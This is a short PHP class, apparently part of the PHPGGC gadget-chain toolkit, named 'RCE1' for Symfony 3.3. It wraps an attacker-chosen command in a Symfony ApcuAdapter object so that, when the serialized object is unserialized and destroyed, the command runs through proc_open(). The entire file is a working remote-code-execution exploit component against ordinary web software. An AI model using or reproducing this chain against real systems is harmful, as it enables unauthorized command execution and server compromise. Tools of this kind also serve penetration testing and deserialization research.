<?php

namespace GadgetChain\Symfony;

class RCE1 extends \PHPGGC\GadgetChain\RCE\Command
{
    public static $version = '3.3';
    public static $vector = '__destruct';
    public static $author = 'cf';
    public static $information = 'Executes given command through proc_open()';

    public function generate(array $parameters)
    {
        $command = $parameters['command'];

        return new \Symfony\Component\Cache\Adapter\ApcuAdapter(
        	$command
        );
    }
}
